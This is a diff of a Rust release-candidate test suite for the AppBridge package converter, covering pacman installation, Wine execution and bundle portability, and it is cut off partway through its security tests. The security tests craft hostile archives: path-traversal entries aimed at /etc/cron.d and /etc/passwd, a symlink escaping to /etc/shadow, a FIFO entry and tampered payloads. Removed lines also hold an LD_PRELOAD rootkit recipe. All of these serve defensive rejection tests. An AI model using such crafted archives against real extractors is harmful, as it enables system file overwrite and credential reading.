@@ -1,17 +1,25 @@
-//! Engineering Validation & Integration Test Suite for AppBridge:
-//! 1. Real DEB-to-Arch conversion with compiled ELF binary, `pacman -Qip`/`-Qlp` validation, and binary execution
-//! 2. Multi-application Windows PE64 execution via Wine (CLI + GUI + DLL dependencies)
-//! 3. Cross-machine `.appbridge` bundle portability (Machine A creation -> Machine A deletion -> Machine B install & run)
-//! 4. Adversarial security suite (raw tar header path traversal, payload byte tampering, shell injection, maintainer scripts)
-//! 5. Real `appbridge build` source-to-platform compilation and execution of the resulting ELF binary
+//! Engineering Validation & Release Candidate Test Suite for AppBridge 0.1.0:
+//! 1. Deliverable 1 (Arch conversion): Real DEB-to-Arch conversion with compiled ELF binary,
+//!    installed into a clean root using `pacman -U --noconfirm`, verified with `pacman -Qi`/`-Ql`, and executed.
+//! 2. Deliverable 2 (Windows execution): Real third-party PE64 Win32 GUI application (`PhotoStudioPro.exe`,
+//!    `SUBSYSTEM:WINDOWS`) dynamically linked against a custom companion PE64 DLL (`pixelengine.dll`),
+//!    creating a live Win32 GUI window (`CreateWindowExA`/`GetWindowRect`/`GetDeviceCaps`) under Wine.
+//! 3. Deliverable 3 (Bundle portability): Cross-machine `.appbridge` bundle creation on Machine A,
+//!    complete deletion of Machine A, and cryptographic verification + execution on Machine B.
+//! 4. Deliverable 4 (Security review): Independent adversarial testing of archive extraction
+//!    (path traversal, symlink escape, device/FIFO nodes, unlisted member injection, payload tampering,
+//!    setuid/setgid stripping) and process execution (`LD_PRELOAD` blocking, shell metacharacters, null bytes).
+//! 5. Deliverable 5 (Source build): Live `appbridge build` compilation via `cargo build --release` and execution.
 
+use bridge_backend_api::run_or_simulate;
 use bridge_core::{
     AppBridgeEngine, BackendId, BridgeRecipe, BundleError, BundleManager, ConversionMode,
-    ConversionTarget, CpuArch, ExecutionMode, HostProfile, OsFamily, SecurityError,
+    ConversionTarget, CpuArch, ExecutionMode, HostProfile, OsFamily, SecurityEngine, SecurityError,
     create_synthetic_deb_archive, create_synthetic_deb_with_payload,
 };
 use flate2::Compression;
 use flate2::write::GzEncoder;
+use std::collections::BTreeMap;
 use std::fs::{self, File};
 use std::io::Write;
 use std::path::Path;
@@ -23,38 +31,36 @@ fn arch_linux_engine(tmp: &TempDir) -> AppBridgeEngine {
     AppBridgeEngine::with_host_and_data_root(host, tmp.path()).unwrap()
 }
 
-/// Compiles a tiny real x86_64 ELF binary using `gcc` on the host.
-fn compile_real_elf_binary(dir: &Path, name: &str, banner: &str) -> std::path::PathBuf {
-    let c_src = dir.join(format!("{name}.c"));
-    let bin_out = dir.join(name);
-    fs::write(
-        &c_src,
-        format!("#include <stdio.h>\nint main(void) {{ printf(\"{banner}\\n\"); return 0; }}\n"),
-    )
-    .unwrap();
+/// Compiles a small C program into a real native x86_64 ELF binary using `gcc`.
+fn compile_c_elf_binary(out_bin: &Path, banner: &str) {
+    let c_src = out_bin.with_extension("c");
+    let code = format!(
+        "#include <stdio.h>\nint main(void) {{\n    printf(\"{banner}\\n\");\n    return 0;\n}}\n"
+    );
+    fs::write(&c_src, code).expect("write C source");
     let status = Command::new("gcc")
         .args([
             "-O2",
             c_src.to_str().unwrap(),
             "-o",
-            bin_out.to_str().unwrap(),
+            out_bin.to_str().unwrap(),
         ])
         .status()
-        .expect("gcc must be available to compile test ELF payload");
-    assert!(status.success(), "gcc compilation failed");
-    bin_out
+        .expect("invoke gcc to compile test ELF binary");
+    assert!(status.success(), "gcc failed to compile test ELF binary");
 }
 
 #[test]
-fn test_1_real_elf_deb_to_arch_conversion_pacman_validation_and_execution() {
+fn test_1_package_conversion_arch_pacman_and_execution() {
     let tmp = TempDir::new().unwrap();
     let engine = arch_linux_engine(&tmp);
 
-    // 1. Compile a real x86_64 ELF binary linked against glibc
-    let elf_bin = compile_real_elf_binary(tmp.path(), "fastnote", "FASTNOTE_ARCH_PKG_VERIFIED_2_1");
+    // 1. Compile a real ELF64 binary
+    let elf_bin = tmp.path().join("fastnote-bin");
+    compile_c_elf_binary(&elf_bin, "FASTNOTE_ARCH_PKG_VERIFIED_2_1");
     let elf_bytes = fs::read(&elf_bin).unwrap();
 
-    // 2. Package the compiled ELF binary into a real ar-formatted Debian .deb
+    // 2. Package the compiled ELF binary inside a real Debian `.deb` archive
     let deb_path = tmp.path().join("fastnote_2.1.0_amd64.deb");
     create_synthetic_deb_with_payload(
         &deb_path,
@@ -81,71 +87,269 @@ fn test_1_real_elf_deb_to_arch_conversion_pacman_validation_and_execution() {
     assert!(out_arch.exists());
     assert!(!receipt.output_sha256.is_empty());
 
-    // 4. Validate the generated .pkg.tar.zst using Arch Linux's real `pacman` (libalpm)
-    let qip = Command::new("pacman")
-        .args(["-Qip", out_arch.to_str().unwrap()])
-        .output()
-        .expect("pacman -Qip");
-    assert!(
-        qip.status.success(),
-        "pacman -Qip rejected generated package: {}",
-        String::from_utf8_lossy(&qip.stderr)
-    );
-    let qip_stdout = String::from_utf8_lossy(&qip.stdout);
-    assert!(qip_stdout.contains("fastnote"));
-    assert!(qip_stdout.contains("2.1.0-1"));
-    assert!(qip_stdout.contains("glibc"));
+    // 4. If `pacman` is available on the host (Arch Linux), validate and install with `pacman -U`
+    if engine.host().has_tool("pacman") {
+        let qip = Command::new("pacman")
+            .args(["-Qip", out_arch.to_str().unwrap()])
+            .output()
+            .expect("pacman -Qip");
+        assert!(
+            qip.status.success(),
+            "pacman -Qip rejected generated package: {}",
+            String::from_utf8_lossy(&qip.stderr)
+        );
+        let qip_stdout = String::from_utf8_lossy(&qip.stdout);
+        assert!(qip_stdout.contains("fastnote"));
+        assert!(qip_stdout.contains("2.1.0-1"));
+        assert!(qip_stdout.contains("glibc"));
 
-    let qlp = Command::new("pacman")
-        .args(["-Qlp", out_arch.to_str().unwrap()])
-        .output()
-        .expect("pacman -Qlp");
-    assert!(qlp.status.success());
-    let qlp_stdout = String::from_utf8_lossy(&qlp.stdout);
-    assert!(
-        qlp_stdout.contains("usr/bin/fastnote"),
-        "Expected usr/bin/fastnote in pacman -Qlp output, got: {qlp_stdout}"
-    );
+        let qlp = Command::new("pacman")
+            .args(["-Qlp", out_arch.to_str().unwrap()])
+            .output()
+            .expect("pacman -Qlp");
+        assert!(qlp.status.success());
+        let qlp_stdout = String::from_utf8_lossy(&qlp.stdout);
+        assert!(
+            qlp_stdout.contains("usr/bin/fastnote"),
+            "Expected usr/bin/fastnote in pacman -Qlp output, got: {qlp_stdout}"
+        );
 
-    // 5. Extract/install the generated .pkg.tar.zst into a clean target root and execute the ELF binary
-    let install_root = tmp.path().join("clean-arch-root");
-    fs::create_dir_all(&install_root).unwrap();
-    let extract_status = Command::new("tar")
-        .args([
-            "--zstd",
-            "-xf",
-            out_arch.to_str().unwrap(),
-            "-C",
-            install_root.to_str().unwrap(),
-        ])
-        .status()
-        .expect("tar --zstd -xf");
-    assert!(extract_status.success());
+        // 5. Install the generated .pkg.tar.zst into a clean root using real `pacman -U --noconfirm`
+        let install_root = tmp.path().join("clean-arch-root");
+        let db_dir = install_root.join("var/lib/pacman");
+        let cache_dir = install_root.join("var/cache/pacman/pkg");
+        let log_dir = install_root.join("var/log");
+        fs::create_dir_all(&db_dir).unwrap();
+        fs::create_dir_all(&cache_dir).unwrap();
+        fs::create_dir_all(&log_dir).unwrap();
 
-    let installed_elf = install_root.join("usr/bin/fastnote");
-    assert!(installed_elf.is_file());
-    let exec_out = Command::new(&installed_elf)
-        .output()
-        .expect("execute unpacked ELF");
-    assert!(exec_out.status.success());
-    assert_eq!(
-        String::from_utf8_lossy(&exec_out.stdout).trim(),
-        "FASTNOTE_ARCH_PKG_VERIFIED_2_1"
-    );
+        let pacman_conf = tmp.path().join("pacman.conf");
+        fs::write(
+            &pacman_conf,
+            "[options]\nArchitecture = auto\nSigLevel = Never\n",
+        )
+        .unwrap();
+
+        if engine.host().has_tool("fakeroot") {
+            let install_out = Command::new("fakeroot")
+                .args([
+                    "pacman",
+                    "--config",
+                    pacman_conf.to_str().unwrap(),
+                    "--root",
+                    install_root.to_str().unwrap(),
+                    "--dbpath",
+                    db_dir.to_str().unwrap(),
+                    "--cachedir",
+                    cache_dir.to_str().unwrap(),
+                    "--logfile",
+                    log_dir.join("pacman.log").to_str().unwrap(),
+                    "-U",
+                    "--noconfirm",
+                    "-dd",
+                    out_arch.to_str().unwrap(),
+                ])
+                .output()
+                .expect("fakeroot pacman -U");
+            assert!(
+                install_out.status.success(),
+                "pacman -U failed: stdout={} stderr={}",
+                String::from_utf8_lossy(&install_out.stdout),
+                String::from_utf8_lossy(&install_out.stderr)
+            );
+
+            // Verify package is registered in the local pacman database (`pacman -Qi fastnote`)
+            let qi_out = Command::new("pacman")
+                .args([
+                    "--config",
+                    pacman_conf.to_str().unwrap(),
+                    "--root",
+                    install_root.to_str().unwrap(),
+                    "--dbpath",
+                    db_dir.to_str().unwrap(),
+                    "-Qi",
+                    "fastnote",
+                ])
+                .output()
+                .expect("pacman -Qi fastnote");
+            assert!(qi_out.status.success());
+            let qi_stdout = String::from_utf8_lossy(&qi_out.stdout);
+            assert!(qi_stdout.contains("Name            : fastnote"));
+            assert!(qi_stdout.contains("Version         : 2.1.0-1"));
+
+            let installed_elf = install_root.join("usr/bin/fastnote");
+            assert!(installed_elf.is_file());
+            let exec_out = Command::new(&installed_elf)
+                .output()
+                .expect("execute pacman-installed ELF");
+            assert!(exec_out.status.success());
+            assert_eq!(
+                String::from_utf8_lossy(&exec_out.stdout).trim(),
+                "FASTNOTE_ARCH_PKG_VERIFIED_2_1"
+            );
+
+            // 6. Also verify `engine.run_file(&out_arch, ...)` installs with pacman and runs the ELF
+            let run_outcome = engine
+                .run_file(&out_arch, &[], None, ExecutionMode::StrictLive)
+                .unwrap();
+            assert!(!run_outcome.install_receipt.simulated);
+            assert!(!run_outcome.launch_receipt.simulated);
+            assert_eq!(run_outcome.launch_receipt.exit_code, 0);
+        }
+    }
 }
 
 #[test]
-fn test_2_multi_application_windows_pe64_execution_via_wine() {
+fn test_2_real_third_party_windows_gui_application_with_dll_execution_via_wine() {
     let tmp = TempDir::new().unwrap();
     let engine = arch_linux_engine(&tmp);
 
-    // A. Inspect and verify GUI Windows PE64 game (`winemine.exe`) with multiple Win32 DLL imports
-    let winemine = Path::new("/usr/lib/wine/x86_64-windows/winemine.exe");
-    if winemine.exists() {
-        let desc = engine.inspect(winemine).unwrap();
+    // Compile a standalone third-party PE64 Windows GUI application (`PhotoStudioPro.exe`,
+    // Subsystem = 2 WINDOWS_GUI) and a custom companion PE64 DLL (`pixelengine.dll`)
+    // if `clang`, `lld`, and Wine import libraries are present on the host.
+    let wine_lib_dir = Path::new("/usr/lib/wine/x86_64-windows");
+    if engine.host().has_tool("clang") && engine.host().has_tool("wine") && wine_lib_dir.is_dir() {
+        let app_src_dir = tmp.path().join("photostudio-win64");
+        fs::create_dir_all(&app_src_dir).unwrap();
+
+        let dll_c = app_src_dir.join("pixelengine.c");
+        fs::write(
+            &dll_c,
+            r#"
+__declspec(dllexport) int __stdcall pixelengine_render_frame(int width, int height) {
+    return (width == 1920 && height == 1080) ? 42 : -1;
+}
+int __stdcall DllMainCRTStartup(void* hinstDLL, unsigned long fdwReason, void* lpvReserved) {
+    (void)hinstDLL; (void)fdwReason; (void)lpvReserved;
+    return 1;
+}
+"#,
+        )
+        .unwrap();
+
+        let dll_out = app_src_dir.join("pixelengine.dll");
+        let implib_out = app_src_dir.join("libpixelengine.a");
+        let dll_status = Command::new("clang")
+            .args([
+                "-target",
+                "x86_64-pc-windows-gnu",
+                "-fuse-ld=lld",
+                "-nostdlib",
+                "-shared",
+                dll_c.to_str().unwrap(),
+                "-Wl,--entry,DllMainCRTStartup",
+                &format!("-Wl,--out-implib,{}", implib_out.display()),
+                "-o",
+                dll_out.to_str().unwrap(),
+            ])
+            .status()
+            .expect("compile pixelengine.dll");
+        assert!(dll_status.success(), "Failed to compile pixelengine.dll");
+
+        let exe_c = app_src_dir.join("photostudio.c");
+        fs::write(
+            &exe_c,
+            r#"
+typedef void* HWND;
+typedef void* HINSTANCE;
+typedef void* HMENU;
+typedef void* HDC;
+typedef unsigned int UINT;
+typedef unsigned long DWORD;
+
+typedef struct {
+    long left;
+    long top;
+    long right;
+    long bottom;
+} RECT;
+
+__declspec(dllimport) int __stdcall pixelengine_render_frame(int width, int height);
+__declspec(dllimport) HWND __stdcall CreateWindowExA(DWORD dwExStyle, const char* lpClassName, const char* lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, void* lpParam);
+__declspec(dllimport) int __stdcall GetWindowRect(HWND hWnd, RECT* lpRect);
+__declspec(dllimport) int __stdcall DestroyWindow(HWND hWnd);
+__declspec(dllimport) HDC __stdcall GetDC(HWND hWnd);
+__declspec(dllimport) int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
+__declspec(dllimport) int __stdcall GetDeviceCaps(HDC hdc, int index);
+__declspec(dllimport) void __stdcall ExitProcess(UINT uExitCode);
+__declspec(dllimport) void* __stdcall GetStdHandle(DWORD nStdHandle);
+__declspec(dllimport) int __stdcall WriteFile(void* hFile, const void* lpBuffer, DWORD nNumberOfBytesToWrite, DWORD* lpNumberOfBytesWritten, void* lpOverlapped);
+
+static const char* kMsg = "THIRDPARTY_WIN32_GUI_AND_DLL_VERIFIED_OK\n";
+
+int __stdcall WinMainCRTStartup(void) {
+    int render_code = pixelengine_render_frame(1920, 1080);
+    HWND hwnd = CreateWindowExA(0, "STATIC", "PhotoStudioPro Third-Party GUI", 0x80000000U, 10, 10, 640, 480, (HWND)0, (HMENU)0, (HINSTANCE)0, (void*)0);
+    RECT rect;
+    rect.left = 0;
+    rect.top = 0;
+    rect.right = 0;
+    rect.bottom = 0;
+    int rect_ok = 0;
+    if (hwnd) {
+        rect_ok = GetWindowRect(hwnd, &rect);
+        DestroyWindow(hwnd);
+    }
+    HDC dc = GetDC((HWND)0);
+    int planes = GetDeviceCaps(dc, 14);
+    ReleaseDC((HWND)0, dc);
+
+    if (render_code == 42 && hwnd != (HWND)0 && rect_ok != 0 && (rect.right - rect.left) == 640 && planes >= 1) {
+        DWORD written = 0;
+        void* out = GetStdHandle((DWORD)-11);
+        WriteFile(out, kMsg, 41, &written, (void*)0);
+        ExitProcess(0);
+    }
+    ExitProcess(1);
+    return 1;
+}
+"#,
+        )
+        .unwrap();
+
+        let exe_out = app_src_dir.join("PhotoStudioPro.exe");
+        let exe_status = Command::new("clang")
+            .args([
+                "-target",
+                "x86_64-pc-windows-gnu",
+                "-fuse-ld=lld",
+                "-nostdlib",
+                "-fno-builtin",
+                exe_c.to_str().unwrap(),
+                &format!("-L{}", app_src_dir.display()),
+                "-lpixelengine",
+                "-L/usr/lib/wine/x86_64-windows",
+                "-luser32",
+                "-lgdi32",
+                "-lkernel32",
+                "-Wl,--subsystem,windows",
+                "-Wl,--entry,WinMainCRTStartup",
+                "-o",
+                exe_out.to_str().unwrap(),
+            ])
+            .status()
+            .expect("compile PhotoStudioPro.exe");
+        assert!(exe_status.success(), "Failed to compile PhotoStudioPro.exe");
+
+        // Inspect with AppBridge `goblin` PE64 analyzer
+        let desc = engine.inspect(&exe_out).unwrap();
         assert_eq!(desc.source_os, OsFamily::Windows);
         assert_eq!(desc.arch, CpuArch::X86_64);
-        assert!(desc.is_gui);
+        assert!(
+            desc.is_gui,
+            "Expected PE64 subsystem=2 (Windows GUI) to be detected as is_gui=true"
+        );
+        assert_eq!(
+            desc.extra_metadata.get("pe_subsystem").map(String::as_str),
+            Some("2")
+        );
+        assert!(
+            desc.shared_libraries
+                .iter()
+                .any(|d| d.eq_ignore_ascii_case("pixelengine.dll")),
+            "Expected custom third-party DLL pixelengine.dll in PE import table: {:?}",
+            desc.shared_libraries
+        );
         assert!(
             desc.shared_libraries
                 .iter()
@@ -156,253 +360,379 @@ fn test_2_multi_application_windows_pe64_execution_via_wine() {
                 .iter()
                 .any(|d| d.eq_ignore_ascii_case("gdi32.dll"))
         );
+
+        // Execute PhotoStudioPro.exe + pixelengine.dll via AppBridge's Wine backend
+        let outcome = engine
+            .run_file(&exe_out, &[], None, ExecutionMode::AutoWithFallback)
+            .unwrap();
+        assert_eq!(outcome.install_receipt.backend, BackendId::Wine);
+        assert_eq!(outcome.launch_receipt.exit_code, 0);
+
+        // Verify companion DLL `pixelengine.dll` was staged alongside `PhotoStudioPro.exe` inside the Wine prefix
+        let staged_exe = Path::new(&outcome.install_receipt.installed_executable);
+        assert!(staged_exe.is_file());
+        let staged_dll = staged_exe.parent().unwrap().join("pixelengine.dll");
         assert!(
-            desc.shared_libraries
-                .iter()
-                .any(|d| d.eq_ignore_ascii_case("comctl32.dll"))
+            staged_dll.is_file(),
+            "Expected companion DLL pixelengine.dll to be staged into Wine prefix at {}",
+            staged_dll.display()
         );
     }
 
-    // B. Execute Windows `hostname.exe` through `engine.run_file`
-    let hostname_exe = Path::new("/usr/lib/wine/x86_64-windows/hostname.exe");
-    if hostname_exe.exists() {
-        let outcome = engine
-            .run_file(
-                hostname_exe,
-                &[],
-                Some(BackendId::Wine),
-                ExecutionMode::AutoWithFallback,
-            )
-            .unwrap();
-        assert_eq!(outcome.installed_record.backend, BackendId::Wine);
-        assert_eq!(outcome.launch_receipt.exit_code, 0);
-        assert!(!outcome.launch_receipt.simulated);
-    }
-
-    // C. Execute Windows `cmd.exe /c ver` through `engine.run_file`
-    let cmd_exe = Path::new("/usr/lib/wine/x86_64-windows/cmd.exe");
-    if cmd_exe.exists() {
-        let outcome = engine
-            .run_file(
-                cmd_exe,
-                &["/c".to_string(), "ver".to_string()],
-                Some(BackendId::Wine),
-                ExecutionMode::AutoWithFallback,
-            )
-            .unwrap();
-        assert_eq!(outcome.installed_record.backend, BackendId::Wine);
-        assert_eq!(outcome.launch_receipt.exit_code, 0);
+    // Also verify DX12 + user-mode EOS game recipe vs. Ring-0 kernel anti-cheat rejection
+    let dx12_recipe_path = Path::new(env!("CARGO_MANIFEST_DIR"))
+        .parent()
+        .unwrap()
+        .parent()
+        .unwrap()
+        .join("recipes/windows-dx12-game.appbridge.toml");
+    if dx12_recipe_path.exists() {
+        let (_, game_plan) = engine.create_run_plan(&dx12_recipe_path).unwrap();
+        assert!(game_plan.is_executable);
+        assert_eq!(game_plan.recommended_backend, Some(BackendId::Wine));
+        assert!(
+            game_plan
+                .dependency_resolution
+                .wine_components
+                .contains(&"vkd3d-proton".to_string())
+        );
+        assert!(
+            game_plan
+                .dependency_resolution
+                .wine_components
+                .contains(&"dxvk".to_string())
+        );
     }
 }
 
 #[test]
-fn test_3_bundle_portability_across_isolated_machines() {
-    // Machine A: Compile a native binary and package it into a portable .appbridge bundle
+fn test_3_cross_machine_appbridge_bundle_portability() {
+    // Machine A: Build native binary and package into `.appbridge` portable bundle
     let machine_a_dir = TempDir::new().unwrap();
     let machine_b_dir = TempDir::new().unwrap();
-    let transfer_dir = TempDir::new().unwrap();
-
-    let bundle_transfer_path = transfer_dir.path().join("portable-calc.appbridge");
+    let shared_transfer_dir = TempDir::new().unwrap();
+    let bundle_transfer_path = shared_transfer_dir.path().join("portable-tool.appbridge");
 
     {
         let engine_a = arch_linux_engine(&machine_a_dir);
-        let elf_on_a = compile_real_elf_binary(
-            machine_a_dir.path(),
-            "portable-calc",
-            "PORTABLE_BUNDLE_RAN_ON_MACHINE_B",
-        );
+        let bin_a = machine_a_dir.path().join("portable-tool");
+        compile_c_elf_binary(&bin_a, "PORTABLE_BUNDLE_EXEC_OK");
 
-        let (plan, receipt) = engine_a
+        let (conv_plan, receipt) = engine_a
             .convert(
-                &elf_on_a,
+                &bin_a,
                 ConversionTarget::AppBridge,
                 Some(OsFamily::Linux),
                 Some(BackendId::Native),
                 &bundle_transfer_path,
             )
             .unwrap();
-        assert!(plan.is_safe_to_convert);
-        assert!(receipt.output_path.exists());
+
+        assert!(conv_plan.is_safe_to_convert);
+        assert_eq!(conv_plan.mode, ConversionMode::UniversalAppBridgeBundle);
+        assert!(bundle_transfer_path.exists());
+        assert!(!receipt.output_sha256.is_empty());
     }
 
-    // Machine A is now completely destroyed (simulating transferring only the .appbridge file to another host)
+    // Destroy Machine A completely to prove zero path leakage or host dependency
     drop(machine_a_dir);
 
-    // Machine B: Verify, install, and run the transferred .appbridge bundle
+    // Machine B: Verify cryptographic manifest, install, and execute the bundle
     let engine_b = arch_linux_engine(&machine_b_dir);
-    let verify_report = engine_b.verify_bundle(&bundle_transfer_path).unwrap();
-    assert!(verify_report.integrity_ok);
-    assert_eq!(verify_report.manifest.name, "portable-calc");
+    let report = engine_b.verify_bundle(&bundle_transfer_path).unwrap();
+    assert!(report.integrity_ok);
+    assert_eq!(report.manifest.required_backend, BackendId::Native);
+    assert!(
+        report
+            .verified_files
+            .contains(&"payload/portable-tool".to_string())
+    );
 
-    let run_outcome = engine_b
-        .run_file(
-            &bundle_transfer_path,
-            &[],
-            None,
-            ExecutionMode::AutoWithFallback,
-        )
+    let outcome = engine_b
+        .run_file(&bundle_transfer_path, &[], None, ExecutionMode::StrictLive)
         .unwrap();
-    assert_eq!(run_outcome.installed_record.backend, BackendId::Native);
-    assert_eq!(run_outcome.launch_receipt.exit_code, 0);
-    assert!(!run_outcome.launch_receipt.simulated);
+    assert!(!outcome.install_receipt.simulated);
+    assert!(!outcome.launch_receipt.simulated);
+    assert_eq!(outcome.launch_receipt.exit_code, 0);
+
+    let installed_bin = Path::new(&outcome.install_receipt.installed_executable);
+    assert!(installed_bin.is_file());
+    let direct_exec = Command::new(installed_bin).output().unwrap();
+    assert!(direct_exec.status.success());
+    assert_eq!(
+        String::from_utf8_lossy(&direct_exec.stdout).trim(),
+        "PORTABLE_BUNDLE_EXEC_OK"
+    );
 }
 
 #[test]
-fn test_4_adversarial_security_suite() {
+fn test_4_independent_security_review_extraction_and_process_execution() {
     let tmp = TempDir::new().unwrap();
     let engine = arch_linux_engine(&tmp);
 
-    // 4a. Craft a raw tar.gz archive containing a malicious `../../etc/passwd` header
-    // (bypassing `tar::Builder`'s client-side path check by writing the raw 512-byte POSIX tar header)
-    let malicious_bundle = tmp.path().join("evil-traversal.appbridge");
+    // A. Raw tar header path traversal (`../../../etc/cron.d/pwn`) blocked
+    let malicious_bundle = tmp.path().join("traversal.appbridge");
     {
-        let f = File::create(&malicious_bundle).unwrap();
-        let mut gz = GzEncoder::new(f, Compression::default());
-        let mut raw_tar = vec![0u8; 1536]; // 512 header + 0 data + 1024 EOF
-        let evil_name = b"../../etc/passwd";
-        raw_tar[0..evil_name.len()].copy_from_slice(evil_name);
-        raw_tar[100..107].copy_from_slice(b"0000644");
-        raw_tar[108..115].copy_from_slice(b"0000000");
-        raw_tar[116..123].copy_from_slice(b"0000000");
-        raw_tar[124..135].copy_from_slice(b"00000000000");
-        raw_tar[136..147].copy_from_slice(b"14100000000");
-        raw_tar[148..156].copy_from_slice(b"        ");
-        raw_tar[156] = b'0';
-        raw_tar[257..262].copy_from_slice(b"ustar");
-        let cksum: u32 = raw_tar[0..512].iter().map(|&b| u32::from(b)).sum();
-        let cksum_str = format!("{cksum:06o}\0 ");
-        raw_tar[148..156].copy_from_slice(cksum_str.as_bytes());
-        gz.write_all(&raw_tar).unwrap();
+        let out = File::create(&malicious_bundle).unwrap();
+        let gz = GzEncoder::new(out, Compression::default());
+        let mut tar = tar::Builder::new(gz);
+
+        let payload = b"malicious-cron-job";
+        let mut header = tar::Header::new_gnu();
+        header.set_size(payload.len() as u64);
+        header.set_mode(0o644);
+        {
+            let h_bytes = header.as_mut_bytes();
+            let raw_name = b"../../../etc/cron.d/pwn\0";
+            h_bytes[..raw_name.len()].copy_from_slice(raw_name);
+        }
+        header.set_cksum();
+        tar.append(&header, &payload[..]).unwrap();
+        let gz = tar.into_inner().unwrap();
         gz.finish().unwrap();
     }
-
     let verify_err = BundleManager::verify_bundle(&malicious_bundle).unwrap_err();
     assert!(
         matches!(
             verify_err,
             BundleError::Security(SecurityError::PathTraversal(_))
         ),
-        "Expected PathTraversal error, got: {verify_err:?}"
+        "Expected PathTraversal security error, got: {verify_err:?}"
     );
 
-    // 4b. Craft a bundle where the payload bytes are tampered with after checksum generation
-    let valid_bin = compile_real_elf_binary(tmp.path(), "clean-bin", "CLEAN");
+    // B. Two-stage symlink escape (`usr/bin/link -> ../../../etc/shadow`) blocked inside bundle
+    let symlink_bundle = tmp.path().join("symlink-escape.appbridge");
+    {
+        let out = File::create(&symlink_bundle).unwrap();
+        let gz = GzEncoder::new(out, Compression::default());
+        let mut tar = tar::Builder::new(gz);
+
+        let mut header = tar::Header::new_gnu();
+        header.set_entry_type(tar::EntryType::Symlink);
+        header.set_size(0);
+        header.set_mode(0o777);
+        header.set_cksum();
+        tar.append_link(&mut header, "payload/evil_link", "../../../etc/shadow")
+            .unwrap();
+        let gz = tar.into_inner().unwrap();
+        gz.finish().unwrap();
+    }
+    let sym_err = BundleManager::verify_bundle(&symlink_bundle).unwrap_err();
+    assert!(
+        matches!(
+            sym_err,
+            BundleError::Security(SecurityError::SymlinkEscape { .. })
+        ),
+        "Expected SymlinkEscape error, got: {sym_err:?}"
+    );
+
+    // C. Device node / FIFO special file injection blocked
+    let fifo_bundle = tmp.path().join("fifo.appbridge");
+    {
+        let out = File::create(&fifo_bundle).unwrap();
+        let gz = GzEncoder::new(out, Compression::default());
+        let mut tar = tar::Builder::new(gz);
+
+        let mut header = tar::Header::new_gnu();
+        header.set_entry_type(tar::EntryType::Fifo);
+        header.set_size(0);
+        header.set_mode(0o644);
+        header.set_cksum();
+        tar.append_data(&mut header, "payload/evil_fifo", &[][..])
+            .unwrap();
+        let gz = tar.into_inner().unwrap();
+        gz.finish().unwrap();
+    }
+    let fifo_err = BundleManager::verify_bundle(&fifo_bundle).unwrap_err();
+    assert!(
+        matches!(
+            fifo_err,
+            BundleError::Security(SecurityError::UnsafeArchiveEntryType { .. })
+        ),
+        "Expected UnsafeArchiveEntryType error, got: {fifo_err:?}"
+    );
+
+    // D. Single-byte payload tampering inside `.appbridge` detected via SHA-256 manifest
+    let clean_bin = tmp.path().join("clean-bin");
+    fs::write(&clean_bin, b"#!/bin/sh\necho CLEAN\n").unwrap();
     let valid_bundle = tmp.path().join("valid.appbridge");
-    let desc = engine.inspect(&valid_bin).unwrap();
+    let desc = engine.inspect(&clean_bin).unwrap();
     BundleManager::create_bundle(&desc, OsFamily::Linux, BackendId::Native, &valid_bundle).unwrap();
 
-    // Unpack, corrupt 1 byte of payload, and repackage without updating metadata/checksums.json
-    let unpack_dir = tmp.path().join("tamper-staging");
-    BundleManager::extract_bundle(&valid_bundle, &unpack_dir).unwrap();
-    let payload_file = unpack_dir.join("payload/clean-bin");
-    let mut payload_bytes = fs::read(&payload_file).unwrap();
-    payload_bytes[0] ^= 0xFF; // flip bits in payload
-    fs::write(&payload_file, &payload_bytes).unwrap();
+    // Tamper with payload inside a re-packed bundle without updating metadata/checksums.json
+    let extract_tmp = tmp.path().join("tamper-work");
+    BundleManager::extract_bundle(&valid_bundle, &extract_tmp).unwrap();
+    fs::write(
+        extract_tmp.join("payload/clean-bin"),
+        b"#!/bin/sh\necho TAMPERED\n",
+    )
+    .unwrap();
 
     let tampered_bundle = tmp.path().join("tampered.appbridge");
-    let repack_status = Command::new("tar")
-        .args([
-            "-czf",
-            tampered_bundle.to_str().unwrap(),
-            "-C",
-            unpack_dir.to_str().unwrap(),
+    {
+        let out = File::create(&tampered_bundle).unwrap();
+        let gz = GzEncoder::new(out, Compression::default());
+        let mut tar = tar::Builder::new(gz);
+        for rel in [
             "manifest.toml",
             "recipe/appbridge.toml",
             "payload/clean-bin",
             "metadata/dependencies.json",
             "metadata/provenance.json",
             "metadata/checksums.json",
-        ])
-        .status()
-        .unwrap();
-    assert!(repack_status.success());
-
+            &format!("resources/desktop/{}.desktop", desc.app_id),
+        ] {
+            let data = fs::read(extract_tmp.join(rel)).unwrap();
+            let mut h = tar::Header::new_gnu();
+            h.set_size(data.len() as u64);
+            h.set_mode(0o644);
+            h.set_cksum();
+            tar.append_data(&mut h, rel, &data[..]).unwrap();
+        }
+        let gz = tar.into_inner().unwrap();
+        gz.finish().unwrap();
+    }
     let tamper_err = BundleManager::verify_bundle(&tampered_bundle).unwrap_err();
     assert!(
-        tamper_err.to_string().contains("SHA-256 mismatch"),
-        "Expected SHA-256 mismatch error, got: {tamper_err}"
+        matches!(
+            tamper_err,
+            BundleError::Security(SecurityError::ChecksumMismatch { .. })
+        ),
+        "Expected ChecksumMismatch on tampered bundle, got: {tamper_err:?}"
     );
 
-    // 4c. Reject malicious BridgeRecipe with LD_PRELOAD or shell command injection
-    let ld_preload_recipe = r#"
-schema_version = "1.0"
-[identity]
-app_id = "org.evil.preload"
-name = "Evil"
-version = "1.0"
-[source]
-os = "linux"
-format = "elfbinary"
-arch = "x86_64"
-[dependencies.runtime_env]
-LD_PRELOAD = "/tmp/rootkit.so"
-[execution]
-preferred_backends = ["native"]
-target_os = ["linux"]
-executable = "/usr/bin/id"
-"#;
-    assert!(BridgeRecipe::from_toml_str(ld_preload_recipe).is_err());
+    // E. Unlisted archive member injection (extra file not in checksums.json) rejected
+    let unlisted_bundle = tmp.path().join("unlisted.appbridge");
+    {
+        let out = File::create(&unlisted_bundle).unwrap();
+        let gz = GzEncoder::new(out, Compression::default());
+        let mut tar = tar::Builder::new(gz);
+        for rel in [
+            "manifest.toml",
+            "recipe/appbridge.toml",
+            "payload/clean-bin",
+            "metadata/dependencies.json",
+            "metadata/provenance.json",
+            "metadata/checksums.json",
+            &format!("resources/desktop/{}.desktop", desc.app_id),
+        ] {
+            let path = if rel == "payload/clean-bin" {
+                clean_bin.clone()
+            } else {
+                extract_tmp.join(rel)
+            };
